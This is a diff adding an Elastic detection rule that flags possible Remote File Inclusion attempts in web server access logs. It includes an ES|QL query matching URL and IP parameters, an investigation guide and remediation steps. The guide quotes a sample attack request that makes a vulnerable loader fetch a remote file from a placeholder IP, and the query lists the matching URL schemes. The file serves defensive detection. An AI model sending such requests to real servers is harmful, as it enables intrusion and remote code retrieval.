@@ -1,0 +1,133 @@
+[metadata]
+creation_date = "2025/12/02"
+integration = ["nginx", "apache", "apache_tomcat", "iis"]
+maturity = "production"
+min_stack_version = "9.2.0"
+min_stack_comments = "The esql url_decode() operator was introduced in version 9.2.0"
+updated_date = "2025/12/08"
+
+[rule]
+author = ["Elastic"]
+description = """
+This rule detects potential Remote File Inclusion (RFI) activity on web servers by identifying HTTP GET requests that
+attempt to access sensitive remote files through directory traversal techniques or known file paths. Attackers may
+exploit RFI vulnerabilities to read sensitive files, gain system information, or further compromise the server.
+"""
+from = "now-11m"
+interval = "10m"
+language = "esql"
+license = "Elastic License v2"
+name = "Web Server Potential Remote File Inclusion Activity"
+note = """## Triage and analysis
+
+> **Disclaimer**:
+> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.
+
+### Investigating Web Server Potential Remote File Inclusion Activity
+
+This rule identifies successful GET requests that pass a remote URL or raw IP in a parameter, signaling Remote File Inclusion attempts that coerce the app to fetch external content or reveal local files. RFI matters because it enables discovery, leaks sensitive data, and can bootstrap code retrieval for persistence or command-and-control. Example behavior: probing an include endpoint with /index.php?page=http://203.0.113.10/drop.txt to verify remote fetch and execution via a vulnerable loader.
+
+### Possible investigation steps
+
+- Decode the full request URL and parameters, identify the endpoint and parameter names, and confirm with application owners whether passing remote URLs is expected behavior for that route.
+- Correlate the event time with outbound connections from the web server to the referenced domain or IP using egress firewall, proxy, DNS, or NetFlow logs to verify whether a fetch occurred.
+- Review adjacent web access entries from the same source IP and user agent to detect scanning behavior, varied include parameters, wrapper strings (php://, data://, file://), or local file probes that indicate exploitation attempts.
+- Check the referenced remote domain or IP with threat intelligence, and if needed, safely retrieve it in an isolated environment to examine content, redirects, and headers for droppers or callbacks.
+- Look for post-inclusion artifacts by checking webroot and temp directories for newly created or modified files, suspicious script writes, and unusual access patterns, and inspect server or application configuration for risky URL include settings.
+
+### False positive analysis
+
+- Applications that legitimately accept full URLs in query parameters for link previews, content proxies, image fetching, or feed importers (e.g., url= or src=) will return 200 and match *=http(s)://*, appearing as RFI despite expected behavior.
+- Administrative or diagnostic endpoints that allow users to supply IP addresses or URI schemes (ftp://, smb://, file://) to test connectivity or preview resources (e.g., target=192.168.1.10) can return 200 and trigger this rule even though no inclusion vulnerability is present.
+
+### Response and remediation
+
+- Immediately block offending source IPs and request patterns at the WAF/reverse proxy (e.g., GETs where page=, url=, or src= contains http://, https://, ftp://, smb://, or file://) and temporarily disable the affected include/loader endpoints until fixed.
+- Restrict outbound connections from the web server to the domains and IPs referenced in the requests and quarantine the host if 200 OK responses align with remote downloads or wrapper usage such as php://, data://, file://.
+- Collect forensic images, then remove newly created or modified scripts in webroot and temp directories (e.g., /var/www, uploads, /tmp), delete unauthorized .htaccess/web.config entries, clear caches, and terminate suspicious processes running under the web server account.
+- Redeploy the application from a known-good build, restore clean configuration files, rotate credentials exposed by local file probes (e.g., config.php, .env), invalidate sessions, and verify functionality before returning the service to production.
+- Harden by disabling risky features and enforcing strict input controls: set PHP allow_url_include=Off and allow_url_fopen=Off, apply open_basedir restrictions, implement scheme/domain allowlists for any include/load functionality, and sanitize and normalize user-supplied parameters.
+- Escalate to incident response and preserve disk and memory images if remote content was fetched and executed, a webshell or unknown script is found in the webroot, or the same actor generates successful 200 RFI-style requests across multiple hosts.
+- Enhance monitoring for RFI attempts by tuning WAF rules to alert on suspicious include parameters, enabling detailed web server logging, and setting up alerts for anomalous outbound connections from web servers.
+"""
+risk_score = 21
+rule_id = "45d099b4-a12e-4913-951c-0129f73efb41"
+severity = "low"
+tags = [
+    "Domain: Web",
+    "Use Case: Threat Detection",
+    "Tactic: Discovery",
+    "Tactic: Command and Control",
+    "Data Source: Nginx",
+    "Data Source: Apache",
+    "Data Source: Apache Tomcat",
+    "Data Source: IIS",
+    "Resources: Investigation Guide",
+]
+timestamp_override = "event.ingested"
+type = "esql"
+query = '''
+from
+  logs-nginx.access-*,
+  logs-apache.access-*,
+  logs-apache_tomcat.access-*,
+  logs-iis.access-*
+| where
+    http.request.method == "GET" and
+    http.response.status_code == 200 and
+    url.original like "*=*"
+
+| eval Esql.url_original_url_decoded_to_lower = to_lower(URL_DECODE(url.original))
+
+| where
+    Esql.url_original_url_decoded_to_lower like "*=http://*" or
+    Esql.url_original_url_decoded_to_lower like "*=https://*" or
+    Esql.url_original_url_decoded_to_lower like "*=ftp://*" or
+    Esql.url_original_url_decoded_to_lower like "*=smb://*" or
+    Esql.url_original_url_decoded_to_lower like "*=file://*" or
+    Esql.url_original_url_decoded_to_lower rlike """.*=.*[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}.*"""
+
+| keep
+    @timestamp,
+    Esql.url_original_url_decoded_to_lower,
+    source.ip,
+    agent.id,
+    host.name,
+    http.request.method,
+    http.response.status_code,
+    event.dataset,
+    data_stream.namespace
+
+| stats
+    Esql.event_count = count(),
+    Esql.url_original_url_decoded_to_lower_count_distinct = count_distinct(Esql.url_original_url_decoded_to_lower),
+    Esql.host_name_values = values(host.name),
+    Esql.agent_id_values = values(agent.id),
+    Esql.http_request_method_values = values(http.request.method),
+    Esql.http_response_status_code_values = values(http.response.status_code),
+    Esql.url_original_url_decoded_to_lower_values = values(Esql.url_original_url_decoded_to_lower),
+    Esql.event_dataset_values = values(event.dataset),
+    Esql.data_stream_namespace_values = values(data_stream.namespace)
+    by source.ip
+'''
+
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+
+[[rule.threat.technique]]
+id = "T1083"
+name = "File and Directory Discovery"
+reference = "https://attack.mitre.org/techniques/T1083/"
+
+[rule.threat.tactic]
+id = "TA0007"
+name = "Discovery"
+reference = "https://attack.mitre.org/tactics/TA0007/"
+
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+
+[rule.threat.tactic]
+id = "TA0011"
+name = "Command and Control"
+reference = "https://attack.mitre.org/tactics/TA0011/"
